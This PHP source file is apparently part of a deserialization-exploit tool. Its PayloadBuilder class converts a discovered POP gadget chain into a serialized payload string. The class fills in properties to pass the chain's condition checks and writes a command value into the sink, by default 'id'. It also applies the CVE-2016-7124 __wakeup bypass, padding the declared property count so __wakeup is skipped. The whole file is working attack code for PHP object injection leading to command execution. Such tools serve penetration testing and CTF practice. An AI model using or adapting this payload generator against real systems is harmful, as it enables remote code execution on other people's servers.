<?php
declare(strict_types=1);

namespace PopChain\Payload;

use PopChain\Model\ArgInfo;
use PopChain\Model\Chain;
use PopChain\Model\ClassInfo;
use PopChain\Model\Edge;
use PopChain\Model\MethodInfo;
use PopChain\Model\PropertyInfo;

/**
 * 把一条 Chain 转成可提交的序列化字符串。
 *
 * 只有"经过属性把控制权交给另一个对象"的边才会在 payload 里生成新节点；
 * $this->m(...) / self::m(...) / Foo::m(...) 这类边仍在同一个对象上执行，
 * 不产生新节点，也不应该往 payload 里塞伪属性。
 */
final class PayloadBuilder
{
    /** 最近一次 build() 是否真的把 sink 值写进了 payload。 */
    public bool $sinkValueWritten = false;

    /** 最近一次 build() 是否用了 CVE-2016-7124 的 __wakeup 绕过（补一个多余属性）。 */
    public bool $wakeupBypassUsed = false;

    /** @var array<int, PayloadNode> 需要用多余属性触发 __wakeup 跳过的节点 */
    private array $nodesNeedingPad = [];

    /** @param array<string, ClassInfo> $classes */
    public function __construct(private array $classes, private bool $obfuscate = false)
    {
    }

    public function build(Chain $chain, mixed $value = 'id'): string
    {
        $this->sinkValueWritten = false;
        $this->wakeupBypassUsed = false;
        $this->nodesNeedingPad = [];
        $nodes = [0 => new PayloadNode($chain->entryClass->name)];
        $current = 0;

        /** @var array<int, int> $fromNode 边索引 => from 方法所在对象的节点索引 */
        $fromNode = [];

        foreach ($chain->edges as $index => $edge) {
            $fromNode[$index] = $current;
            if ($this->isInternalEdge($edge)) {
                continue;
            }
            $next = new PayloadNode($edge->toClass->name);
            // 属性属于 fromClass（当前这个对象），不是下一个 gadget 的类
            $this->setProperty($nodes[$current], $edge->fromClass, $edge->viaProperty, $next);
            $current++;
            $nodes[$current] = $next;
        }

        $this->applyPreconditions($chain, $nodes, $fromNode);
        $this->fillArraySlots($chain, $nodes, $fromNode);
        $this->applySinkValue($chain, $nodes, $fromNode, $current, $value);
        $this->padWakeupBlockedNodes($nodes);

        return (new Serializer($this->obfuscate))->serializeNode($nodes[0]);
    }

    /**
     * 把方法里的条件判断要求写进对应对象：
     * 例如 if ($this->is_admin === true) / if ($this->token === 'admin_token')。
     *
     * @param array<int, PayloadNode> $nodes
     * @param array<int, int> $fromNode
     */
    private function applyPreconditions(Chain $chain, array $nodes, array $fromNode): void
    {
        $this->applyMethodPreconditions($nodes[0] ?? null, $chain->entryClass, $chain->entryMethod);

        foreach ($chain->edges as $index => $edge) {
            $nodeIndex = $this->isInternalEdge($edge)
                ? ($fromNode[$index] ?? 0)
                : (($fromNode[$index] ?? 0) + 1);
            $this->applyMethodPreconditions($nodes[$nodeIndex] ?? null, $edge->toClass, $edge->toMethod);
        }
    }

    /** @param array<string, mixed> $preconditions */
    private function applyMethodPreconditions(?PayloadNode $node, ClassInfo $class, MethodInfo $method): void
    {
        if ($node === null) {
            return;
        }
        foreach ($method->preconditions as $property => $value) {
            $this->setProperty($node, $class, (string) $property, $value);
        }
    }

    /** 方法调用 / 静态调用不改变对象图，只是同一个对象内的跳转。 */
    private function isInternalEdge(Edge $edge): bool
    {
        return $edge->viaProperty === '(this)' || $edge->viaProperty === '(static)';
    }

    /**
     * 回调通过数组传参时，先把数组属性的所有槽位建出来（占位空串）。
     *
     * @param array<int, PayloadNode> $nodes
     * @param array<int, int> $fromNode
     */
    private function fillArraySlots(Chain $chain, array $nodes, array $fromNode): void
    {
        /** @var array<int, array<string, array{indexes: array<int,true>, class: ClassInfo}>> $slots */
        $slots = [];

        foreach ($chain->edges as $index => $edge) {
            foreach ($edge->argMapping as $arg) {
                if ($arg->kind !== ArgInfo::ARRAY_ELEMENT || $arg->name === null) {
                    continue;
                }
                $nodeIndex = $fromNode[$index] ?? 0;
                $slots[$nodeIndex][$arg->name]['indexes'][(int) $arg->literal] = true;
                $slots[$nodeIndex][$arg->name]['class'] = $edge->fromClass;
            }
        }

        foreach ($slots as $nodeIndex => $properties) {
            if (!isset($nodes[$nodeIndex])) {
                continue;
            }
            foreach ($properties as $name => $slot) {
                if ($nodes[$nodeIndex]->has($name)) {
                    continue;
                }
                $array = [];
                foreach (array_keys($slot['indexes']) as $position) {
                    $array[$position] = '';
                }
                ksort($array);
                $this->setProperty($nodes[$nodeIndex], $slot['class'], $name, $array);
            }
        }
    }

    /**
     * @param array<int, PayloadNode> $nodes
     * @param array<int, int> $fromNode
     */
    private function applySinkValue(Chain $chain, array $nodes, array $fromNode, int $sinkNode, mixed $value): void
    {
        $hit = $chain->sink;
        if ($hit === null || !isset($nodes[$sinkNode])) {
            return;
        }

        $sinkClass = $chain->sinkObjectClass();
        if ($sinkClass === null) {
            return;
        }

        $arg = $hit->arg;
        $target = $arg->targetProperty();
        if ($target !== null && $this->isWritableArg($arg)) {
            $this->setProperty($nodes[$sinkNode], $sinkClass, $target, $value);
            $this->sinkValueWritten = true;
            return;
        }

        // __call 的 $args[k]：值来自调用点的第 k 个实参
        if ($arg->kind === ArgInfo::ARG_ELEMENT) {
            $path = $arg->path();
            $index = (int) ($path[0] ?? 0);
            $this->sinkValueWritten = $this->backtrack(
                $chain,
                $fromNode,
                count($chain->edges) - 1,
                $index,
                $value,
                $nodes,
            );
            return;
        }

        // __unserialize 的 $data['x'] 直接进 sink
        if ($arg->kind === ArgInfo::PARAM_ELEMENT) {
            $this->writeParameterElement($nodes[$sinkNode], $sinkClass, $arg, $value);
            $this->sinkValueWritten = true;
            return;
        }

        if ($arg->kind === ArgInfo::VARIABLE && $arg->name !== null) {
            $position = $chain->sinkObjectMethod()?->paramNamed($arg->name)?->position;
            if ($position !== null) {
                $this->sinkValueWritten = $this->backtrack(
                    $chain,
                    $fromNode,
                    count($chain->edges) - 1,
                    $position,
                    $value,
                    $nodes,
                );
            }
        }
    }

    /** 只有属性和字符串拼接可以写入 payload；回调数组等由边本身决定。 */
    private function isWritableArg(ArgInfo $arg): bool
    {
        return $arg->kind === ArgInfo::THIS_PROPERTY || $arg->kind === ArgInfo::CONCAT;
    }

    /**
     * 沿边反向找回"这个 sink 参数是从哪个属性传进来的"。
     *
     * @param array<int, int> $fromNode
     * @param array<int, PayloadNode> $nodes
     */
    private function backtrack(
        Chain $chain,
        array $fromNode,
        int $edgeIndex,
        int $position,
        mixed $value,
        array $nodes,
    ): bool {
        if ($edgeIndex < 0) {
            return false;
        }

        $edge = $chain->edges[$edgeIndex];
        $arg = $edge->argMapping[$position] ?? null;
        if ($arg === null) {
            return false;
        }

        $nodeIndex = $fromNode[$edgeIndex] ?? 0;

        if ($arg->kind === ArgInfo::THIS_PROPERTY && $arg->name !== null) {
            $this->setProperty($nodes[$nodeIndex], $edge->fromClass, $arg->name, $value);
            return true;
        }

        if ($arg->kind === ArgInfo::CONCAT && $arg->targetProperty() !== null) {
            $this->setProperty($nodes[$nodeIndex], $edge->fromClass, (string) $arg->targetProperty(), $value);
            return true;
        }

        // 入口魔术方法的参数数组元素（$data['cmd'] / $data['a']['b']）
        if ($arg->kind === ArgInfo::PARAM_ELEMENT) {
            $this->writeParameterElement($nodes[$nodeIndex], $edge->fromClass, $arg, $value);
            return true;
        }

        // 回调通过数组传参：写数组槽位，而不是标量（否则运行时是 TypeError）
        if ($arg->kind === ArgInfo::ARRAY_ELEMENT && $arg->name !== null) {
            $this->writeArraySlot($nodes[$nodeIndex], $edge->fromClass, $arg->name, (int) $arg->literal, $value);
            return true;
        }

        if ($arg->kind === ArgInfo::VARIABLE && $arg->name !== null) {
            $parentPosition = $edge->fromMethod->paramNamed($arg->name)?->position;
            if ($parentPosition !== null) {
                return $this->backtrack($chain, $fromNode, $edgeIndex - 1, $parentPosition, $value, $nodes);
            }
        }

        return false;
    }

    /** 把 __unserialize 的 $data['a']['b'] 写成嵌套数组属性。 */
    private function writeParameterElement(PayloadNode $node, ClassInfo $class, ArgInfo $arg, mixed $value): void
    {
        $path = $arg->path();
        if ($path === []) {
            return;
        }

        $wrapped = $value;
        for ($index = count($path) - 1; $index >= 1; $index--) {
            $wrapped = [$path[$index] => $wrapped];
        }

        $node->set((string) $path[0], $wrapped, 'public', $class->name);
    }

    /** 写回调数组的某个槽位，保留已有的其它槽位。 */
    private function writeArraySlot(PayloadNode $node, ClassInfo $class, string $name, int $index, mixed $value): void
    {
        $array = $node->properties[$name]['value'] ?? [];
        if (!is_array($array)) {
            $array = [];
        }
        $array[$index] = $value;
        ksort($array);
        $this->setProperty($node, $class, $name, $array);
    }

    private function setProperty(PayloadNode $node, ClassInfo $class, string $name, mixed $value): void
    {
        // 这个属性会被 __wakeup 重置成字面量时，需要 CVE-2016-7124 的绕过
        $objectClass = $this->classes[$node->class] ?? $class;
        if ($this->propertyOverwrittenByWakeup($objectClass, $name)) {
            $this->nodesNeedingPad[spl_object_id($node)] = $node;
        }

        $property = $this->findProperty($class, $name);
        $node->set(
            $name,
            $value,
            $property?->visibility ?? 'public',
            $property?->declaringClass ?? $class->name,
        );
    }

    /**
     * 被 __wakeup 重置的属性：把声明的属性个数多写 1 个、body 少给一个，
     * unserialize 会在该对象处解析失败；失败时 __wakeup 被跳过，但已构造对象的析构函数照跑，
     * 可控属性因此得以保留（CVE-2016-7124 的利用方式）。
     *
     * @param array<int, PayloadNode> $nodes
     */
    private function padWakeupBlockedNodes(array $nodes): void
    {
        foreach ($this->nodesNeedingPad as $node) {
            $class = $this->classes[$node->class] ?? null;
            if ($class === null) {
                continue;
            }
            // 声明数必须大于类的实际属性数，body 里又不给足，unserialize 才会在该对象处失败
            $actual = $this->propertyCount($class);
            $node->declaredBump = max(1, $actual + 1 - count($node->properties));
            $this->wakeupBypassUsed = true;
        }
    }

    /** 类（含父类）声明的属性个数。 */
    private function propertyCount(ClassInfo $class): int
    {
        $count = 0;
        $seen = [];
        $current = $class;
        while ($current !== null && !isset($seen[$current->name])) {
            $seen[$current->name] = true;
            $count += count($current->properties);
            $current = $current->parent !== null ? ($this->classes[$current->parent] ?? null) : null;
        }
        return $count;
    }

    /** 类（含父类）的 __wakeup 是否把这个属性写成了字面量。 */
    private function propertyOverwrittenByWakeup(ClassInfo $class, string $property): bool
    {
        if ($this->findMethod($class, '__unserialize') !== null) {
            return false;
        }
        $wakeup = $this->findMethod($class, '__wakeup');
        if ($wakeup === null) {
            return false;
        }
        return in_array($property, $wakeup->constantProperties, true);
    }

    private function findMethod(ClassInfo $class, string $name): ?MethodInfo
    {
        $seen = [];
        $current = $class;
        while ($current !== null && !isset($seen[$current->name])) {
            $seen[$current->name] = true;
            $method = $current->method($name);
            if ($method !== null) {
                return $method;
            }
            $current = $current->parent !== null ? ($this->classes[$current->parent] ?? null) : null;
        }
        return null;
    }

    private function findProperty(ClassInfo $class, string $name): ?PropertyInfo
    {
        $seen = [];
        $current = $class;
        while ($current !== null && !isset($seen[$current->name])) {
            $seen[$current->name] = true;
            $property = $current->property($name);
            if ($property !== null) {
                return $property;
            }
            $current = $current->parent !== null ? ($this->classes[$current->parent] ?? null) : null;
        }
        return null;
    }
}
